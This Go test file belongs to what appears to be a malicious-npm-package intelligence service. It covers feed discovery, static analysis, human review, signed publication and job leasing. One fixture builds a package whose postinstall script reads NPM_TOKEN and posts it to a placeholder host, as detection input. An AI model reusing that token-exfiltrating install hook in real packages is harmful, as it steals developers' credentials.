package store_test

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/ossf/package-feeds/pkg/feeds"
	"zoli.dev/intel-feed/internal/analysis"
	"zoli.dev/intel-feed/internal/config"
	"zoli.dev/intel-feed/internal/discovery"
	"zoli.dev/intel-feed/internal/feed"
	"zoli.dev/intel-feed/internal/model"
	"zoli.dev/intel-feed/internal/netfetch"
	"zoli.dev/intel-feed/internal/store"
	"zoli.dev/intel-feed/pkg/client"
)

type staticFeed struct{ now time.Time }

func (f staticFeed) GetName() string                   { return "npm" }
func (f staticFeed) GetFeedOptions() feeds.FeedOptions { return feeds.FeedOptions{} }
func (f staticFeed) Latest(time.Time) ([]*feeds.Package, time.Time, []error) {
	return []*feeds.Package{feeds.NewPackage(f.now, "example", "1.0.0", "npm")}, f.now, nil
}

func TestStaticDiscoveryReviewAndSignedPublication(t *testing.T) {
	s := isolated(t)
	ctx := context.Background()
	d := discovery.Discovery{Store: s, Feeds: []feeds.ScheduledFeed{staticFeed{time.Now().UTC()}}}
	if err := d.Initialize(ctx); err != nil {
		t.Fatal(err)
	}
	if err := d.Run(ctx); err != nil {
		t.Fatal(err)
	}
	if err := d.Run(ctx); err != nil {
		t.Fatal(err)
	}
	var jobs int
	if err := s.DB.QueryRowContext(ctx, "SELECT count(*) FROM jobs").Scan(&jobs); err != nil || jobs != 1 {
		t.Fatal(jobs, err)
	}
	var archive bytes.Buffer
	tw := tar.NewWriter(&archive)
	for _, file := range []struct{ name, body string }{
		{"package/package.json", `{"name":"example","version":"1.0.0","scripts":{"postinstall":"node index.js"}}`},
		{"package/index.js", `const token = process.env.NPM_TOKEN; fetch("https://example.invalid/", {body:token});`},
	} {
		if err := tw.WriteHeader(&tar.Header{Name: file.name, Mode: 0600, Size: int64(len(file.body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := io.WriteString(tw, file.body); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	digest := sha512.Sum512(archive.Bytes())
	metadata := fmt.Sprintf(`{"name":"example","version":"1.0.0","dist":{"tarball":"https://registry.npmjs.org/example/-/example.tgz","integrity":"sha512-%s"}}`, base64.StdEncoding.EncodeToString(digest[:]))
	network := &netfetch.Client{Hosts: map[string]bool{"registry.npmjs.org": true}, HTTP: &http.Client{Transport: roundTrip(func(r *http.Request) (*http.Response, error) {
		var body io.Reader
		switch r.URL.Path {
		case "/example/1.0.0":
			body = strings.NewReader(metadata)
		case "/example/-/example.tgz":
			body = bytes.NewReader(archive.Bytes())
		default:
			return nil, fmt.Errorf("unexpected request %s", r.URL.Path)
		}
		return &http.Response{StatusCode: 200, Header: http.Header{}, Body: io.NopCloser(body)}, nil
	})}}
	rules, err := analysis.LoadRules("../../rules/rules.yaml")
	if err != nil {
		t.Fatal(err)
	}
	w := analysis.Worker{Store: s, Client: network, Config: config.Default().Analysis, Rules: rules, Dir: t.TempDir()}
	for i := 0; i < 2; i++ {
		if ran, err := w.RunOne(ctx); err != nil || !ran {
			t.Fatal(ran, err)
		}
	}
	if ran, err := w.RunOne(ctx); err != nil || ran {
		t.Fatal("duplicate work", ran, err)
	}
	all, err := s.Records(ctx, false)
	if err != nil || len(all) != 1 || all[0].Status != "pending" || len(all[0].Evidence) < 2 {
		t.Fatal(all, err)
	}
	_, key, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	p := feed.Publisher{Store: s, Dir: t.TempDir(), Key: key, RuleSetSHA256: rules.Hash}
	if err = p.Publish(ctx); err != nil {
		t.Fatal(err)
	}
	_, _, records, err := s.Publication(ctx)
	if err != nil || len(records) != 0 {
		t.Fatal("unreviewed finding published", records, err)
	}
	approved, err := s.Review(ctx, all[0].ID, "approve", "fixture-reviewer", "Controlled evidence reviewed", "malicious", all[0].Revision)
	if err != nil {
		t.Fatal(err)
	}
	if err = p.Publish(ctx); err != nil {
		t.Fatal(err)
	}
	_, raw, records, err := s.Publication(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var env feed.Envelope
	if err = json.Unmarshal(raw, &env); err != nil {
		t.Fatal(err)
	}
	snapshot := client.Snapshot{Envelope: env, Records: records}
	pub := key.Public().(ed25519.PublicKey)
	q := all[0].Affected[0].Package
	result, err := snapshot.Query(q, pub)
	if err != nil || result.Status != "known_match" {
		t.Fatal(result, err)
	}
	if _, err = s.Review(ctx, all[0].ID, "withdraw", "fixture-reviewer", "Corrected fixture", "", approved.Revision); err != nil {
		t.Fatal(err)
	}
	if err = p.Publish(ctx); err != nil {
		t.Fatal(err)
	}
	_, _, withdrawn, err := s.Publication(ctx)
	if err != nil || len(withdrawn) != 1 || withdrawn[0].Status != "withdrawn" {
		t.Fatal(withdrawn, err)
	}
	if delta := feed.Diff(records, withdrawn); len(delta) != 1 || delta[0].Operation != "withdraw" {
		t.Fatal(delta)
	}
}

func TestStaticCompletionFencesEffectsAndRollsBackTogether(t *testing.T) {
	s := isolated(t)
	ctx := context.Background()
	if err := s.Enqueue(ctx, "static-artifact", "fixture", map[string]string{}, 0); err != nil {
		t.Fatal(err)
	}
	first, err := s.Claim(ctx, "static-artifact", time.Minute)
	if err != nil || first == nil {
		t.Fatal(first, err)
	}
	if _, err = s.DB.ExecContext(ctx, "UPDATE jobs SET lease_until=now()-interval '1 second' WHERE id=$1", first.ID); err != nil {
		t.Fatal(err)
	}
	r := sample()
	next := []store.Followup{{Kind: "runtime", Key: "followup", Payload: map[string]string{"fixture": "yes"}}}
	if err = s.CompleteStatic(ctx, *first, map[string]string{"status": "analyzed"}, &r, next); err == nil {
		t.Fatal("expired worker accepted")
	}
	second, err := s.Claim(ctx, "static-artifact", time.Minute)
	if err != nil || second == nil {
		t.Fatal(second, err)
	}
	if err = s.CompleteStatic(ctx, *first, nil, &r, next); err == nil {
		t.Fatal("superseded worker accepted")
	}
	// A serialization failure after candidate ingestion must roll everything back.
	bad := []store.Followup{{Kind: "runtime", Key: "bad", Payload: make(chan int)}}
	if err = s.CompleteStatic(ctx, *second, nil, &r, bad); err == nil {
		t.Fatal("invalid followup accepted")
	}
	all, err := s.Records(ctx, false)
	if err != nil || len(all) != 0 {
		t.Fatal("candidate escaped failed completion", all, err)
	}
	var count int
	if err = s.DB.QueryRowContext(ctx, "SELECT count(*) FROM jobs WHERE kind='runtime'").Scan(&count); err != nil || count != 0 {
		t.Fatal(count, err)
	}
	if err = s.CompleteStatic(ctx, *second, map[string]string{"status": "analyzed"}, &r, next); err != nil {
		t.Fatal(err)
	}
	if _, err = s.Review(ctx, r.ID, "approve", "tester", "approved", "malicious", 1); err != nil {
		t.Fatal(err)
	}
	r.Summary = "stale worker replacement"
	if err = s.CompleteStatic(ctx, *first, nil, &r, next); err == nil {
		t.Fatal("stale worker revised approved candidate")
	}
	got, err := s.Get(ctx, r.ID)
	if err != nil || got.Status != "published" || got.Revision != 2 {
		t.Fatal(got, err)
	}
	if err = s.DB.QueryRowContext(ctx, "SELECT count(*) FROM jobs WHERE kind='runtime'").Scan(&count); err != nil || count != 1 {
		t.Fatal(count, err)
	}
}

func TestStaticWorkerSkipsRetriesAndBudgetsStayExplicit(t *testing.T) {
	for _, scenario := range []string{"missing", "hash-mismatch", "malformed-archive", "budget-exhausted"} {
		t.Run(scenario, func(t *testing.T) {
			s := isolated(t)
			ctx := context.Background()
			body := []byte("not a package archive")
			a := analysis.Artifact{Package: model.Identity{Ecosystem: "npm", Name: "example", Version: "1.0.0"}, URL: "https://registry.npmjs.org/example.tgz", SHA256: model.Hash(body)}
			if scenario == "hash-mismatch" {
				a.SHA256 = strings.Repeat("0", 64)
			}
			if err := s.Enqueue(ctx, "static-artifact", "fixture", analysis.ArtifactJob{Artifact: a}, 0); err != nil {
				t.Fatal(err)
			}
			calls := 0
			network := &netfetch.Client{Hosts: map[string]bool{"registry.npmjs.org": true}, HTTP: &http.Client{Transport: roundTrip(func(*http.Request) (*http.Response, error) {
				calls++
				status := 200
				if scenario == "missing" {
					status = 404
				}
				return &http.Response{StatusCode: status, Header: http.Header{}, Body: io.NopCloser(bytes.NewReader(body))}, nil
			})}}
			limits := config.Default().Analysis
			if scenario == "budget-exhausted" {
				limits.DailyBytes = 1
			}
			w := analysis.Worker{Store: s, Client: network, Config: limits, Dir: t.TempDir()}
			if ran, err := w.RunOne(ctx); err != nil || !ran {
				t.Fatal(ran, err)
			}
			var status, detail string
			var result []byte
			var attempts int
			if err := s.DB.QueryRowContext(ctx, "SELECT status,last_error,result,attempts FROM jobs WHERE kind='static-artifact'").Scan(&status, &detail, &result, &attempts); err != nil {
				t.Fatal(err)
			}
			if scenario == "budget-exhausted" {
				if calls != 0 || status != "queued" || attempts != 0 || detail == "" {
					t.Fatal(calls, status, attempts, detail)
				}
			} else if scenario == "hash-mismatch" {
				if status != "queued" || attempts != 1 || detail == "" {
					t.Fatal(status, attempts, detail)
				}
			} else {
				var report analysis.Result
				if err := json.Unmarshal(result, &report); err != nil || status != "skipped" || report.Status != "skipped" || report.Reason == "" {
					t.Fatal(status, report, err)
				}
			}
			all, err := s.Records(ctx, false)
			if err != nil || len(all) != 0 {
				t.Fatal("failed work created a finding", all, err)
			}
		})
	}
}
